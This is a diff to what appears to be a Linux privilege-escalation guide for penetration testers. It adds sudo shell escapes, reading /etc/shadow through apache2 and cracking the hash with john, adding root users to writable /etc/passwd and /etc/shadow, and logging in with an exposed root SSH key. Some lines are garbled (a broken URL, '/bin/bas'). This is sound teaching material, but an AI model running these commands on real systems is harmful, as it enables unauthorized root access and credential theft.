@@ -889,7 +889,6 @@ grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/logi
 ### Known passwords
 
 If you **know any password** of the environment **try to login as each user** using the password.
-
 ### Su Brute
 
 If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
@@ -906,6 +905,8 @@ If you find that you can **write inside some folder of the $PATH** you may be ab
 You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:
 
 ```bash
+sudo <program> #Run a program using sudo
+sudo –u <username> <program> #Run a program as a specific user
 sudo -l #Check commands you can execute with sudo
 find / -perm -4000 2>/dev/null #Find all SUID binaries
 ```
@@ -921,10 +922,22 @@ ftp>!/bin/sh
 less>! <shell_comand>
 ```
 
-### NOPASSWD
+#### Known Password
+If a low-privileged user can run sudo without restrictions and knows the password, privilege escalation is simple. Just use the `su` command to switch to a root shell:
+`sudo su`
+If for some reason the su program is not allowed, there are many other ways to escalate privileges:
+```bash
+sudo -s
+sudo -i
+sudo /bin/bash
+sudo passwd
+```
+***Even if there are no “obvious” methods for escalating privileges, we may be able to use a shell escape sequence.***
+
+#### Shell Escape Sequences(NOPASSWD)
 
 Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.
-
+Even if we are restricted to running certain programs via sudo, it is sometimes possible to “escape” the program and spawn a shell.
 ```
 $ sudo -l
 User demo may run the following commands on crashlab:
@@ -935,6 +948,44 @@ In this example the user `demo` can run `vim` as `root`, it is now trivial to ge
 
 ```
 sudo vim -c '!sh'
+```
+Since the initial program runs with root privileges, so does the spawned shell.
+
+***A list of programs with their shell escape sequences can be found here:*** 
+https://gtfobins.gi..thub.io/
+#### Abusing Intended Functionality
+If a program doesn’t have an escape sequence, it may still be possible to use it to escalate privileges.
+If we can read files owned by root, we may be able to extract useful information (e.g. passwords, hashes, keys).
+If we can write to files owned by root, we may be able to insert or modify information.
+1. List the programs your user is allowed to run via sudo:
+```bash 
+sudo -l
+...
+(root) NOPASSWD: /usr/sbin/apache2
+```
+>Note that apache2 is in the list.
+2. apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand.
+3. Run apache2 using sudo, and provide it the /etc/shadow file as a config file:
+```bash
+sudo apache2 -f /etc/shadow
+Syntax error on line 1 of /etc/shadow:
+Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84O
+WAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7::
+:', perhaps misspelled or defined by a module not included in the ser
+ver configuration
+```
+4. Extract the root user’s hash from the file.
+```bash
+echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl
+aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
+```
+5. crack the password hash using john:
+`john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
+6.  Use the su command to switch to the root user, entering the password we cracked when prompted:
+```su
+Password:
+root@debian:/# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ### SETENV
@@ -1488,9 +1539,14 @@ In some occasions you can find **password hashes** inside the `/etc/passwd` (or 
 grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 ```
 
-### readable /etc/passwd
+### readable /etc/shadow
 
 The /etc/shadow file contains user password hashes, and by default is not readable by any user except for root. If we are able to read the contents of the /etc/shadow file, we might be able to crack the root user’s password hash. If we are able to modify the /etc/shadow file, we can replace the root user’s password hash with one we know.
+
+using **_lse.sh_** ( linux smart enumeration) script :
+```bash
+[!] sys030 Can we read /etc/shadow file?................................... yes!
+```
 
 1. Check the permissions of the /etc/shadow file:
 ```bash
@@ -1527,7 +1583,29 @@ root@debian:/# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+### Writable /etc/shadow
+
+```bash
+[!] fst160 Can we write to critical files?................................. yes!
+> /etc/shadow
+```
+1. Check the permissions of the /etc/shadow file: 
+`ls -l /etc/shadow` -> `-rw-r—rw-`
+> Note that it is world writable.
+
+2. Generate a new SHA-512 password hash:
+`mkpasswd -m sha-512 newpassword`
+3. Edit the /etc/shadow and replace the root user’s
+`hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash`
 ### Writable /etc/passwd
+
+Check the permissions of the /etc/passwd file:
+```bash
+$ ls -l /etc/passwd
+-rw-r--rw- 1 root root 951 May 13
+2017 /etc/passwd
+```
+>Note that it is world writable
 
 First, generate a password with one of the following commands.
 
@@ -1547,7 +1625,7 @@ E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
 You can now use the `su` command with `hacker:hacker`
 
-Alternatively, you can use the following lines to add a dummy user without a password.\
+***Alternatively, you can use the following lines to add a dummy user without a password.***
 WARNING: you might degrade the current security of the machine.
 
 ```
@@ -1556,6 +1634,9 @@ su - dummy
 ```
 
 NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.
+
+***Alternatively, append a new row to /etc/passwd to create an alternate root user (e.g. newroot)***
+`newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bas`
 
 You should check if you can **write in some sensitive files**. For example, can you write to some **service configuration file**?
 
@@ -1646,6 +1727,68 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ```bash
 find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
 ```
+
+Even if a machine has correct permissions on important or sensitive files, insecure backups of these files may exist. It’s worth exploring the file system to find readable backup files. Common locations include:
+
+- User home directories
+- `/` (root) directory
+- `/tmp`
+- `/var/backups`
+
+---
+
+*** Steps:***
+1. **Look for interesting files, especially hidden files, in common locations:**
+
+   ```bash
+   $ ls -la /home/user
+   $ ls -la /
+   $ ls -la /tmp
+   $ ls -la /var/backups
+   ```
+
+2. **Identify a hidden `.ssh` directory in the system root:**
+
+   ```bash
+   $ ls -la /
+   drwxr-xr-x 2 root root 4096 Aug 24 18:57 .ssh
+   ```
+
+3. **Check for world-readable files in the `.ssh` directory (e.g., `root_key`):**
+
+   ```bash
+   $ ls -l /.ssh
+   total 4
+   -rw-r--r-- 1 root root 1679 Aug 24 18:57 root_key
+   ```
+
+4. **Inspect the file to determine its type (likely an SSH private key):**
+
+   ```bash
+   $ head -n 1 /.ssh/root_key
+   -----BEGIN RSA PRIVATE KEY-----
+   ```
+
+5. **Check if root logins are allowed via SSH:**
+
+   ```bash
+   $ grep PermitRootLogin /etc/ssh/sshd_config
+   PermitRootLogin yes
+   ```
+
+6. **Copy the key to your local machine and set correct permissions:**
+
+   ```bash
+   # chmod 600 root_key
+   ```
+
+7. **Use the key to SSH into the target as root:**
+
+   ```bash
+   # ssh -i root_key root@192.168.1.25
+   ```
+
+---
 
 ### Known files containing passwords
 
